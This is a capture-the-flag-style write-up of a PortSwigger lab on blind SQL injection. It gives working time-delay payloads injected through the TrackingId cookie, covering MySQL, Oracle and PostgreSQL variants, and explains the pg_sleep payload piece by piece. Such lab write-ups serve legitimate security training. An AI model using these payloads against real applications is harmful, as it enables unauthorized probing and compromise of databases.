# Blind SQL Injection with Time Delays Writeup
# Lab: Blind SQL injection with time delays - [Link](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
## Goal
Exploit a blind SQL injection in the `TrackingId` cookie to cause a 10-second delay in the application's response.

## Vulnerability
The app uses the `TrackingId` cookie in a SQL query without sanitization. No query results or errors are shown, but synchronous query execution allows time-based delays to confirm injection.

## Solution Steps
1. **Test Payloads**:
   - Cookie: `TrackingId=5zPn80GQj1fQ58Nz'||(SELECT SLEEP(10))--; session=f4a3WY4FNQb8lefiLqJl3WCksRzlVjGV`
     - No delay (MySQL-specific `SLEEP` failed).
   - Cookie: `TrackingId=5zPn80GQj1fQ58Nz'||(dbms_pipe.receive_message(('a'),10))--; session=f4a3WY4FNQb8lefiLqJl3WCksRzlVjGV`
     - No delay (Oracle-specific `dbms_pipe` failed).
   - Cookie: `TrackingId=5zPn80GQj1fQ58Nz'||(SELECT pg_sleep(10))--; session=f4a3WY4FNQb8lefiLqJl3WCksRzlVjGV`
     - Success! 10-second delay (PostgreSQL-specific `pg_sleep` worked).

2. **Winning Payload**:
   - `5zPn80GQj1fQ58Nz'||(SELECT pg_sleep(10))--`:
     - `'` closes the query string.
     - `||` concatenates in PostgreSQL.
     - `pg_sleep(10)` delays for 10 seconds.
     - `--` comments out trailing query parts.

3. **Result**: The 10-second delay confirms the injection, solving the lab.
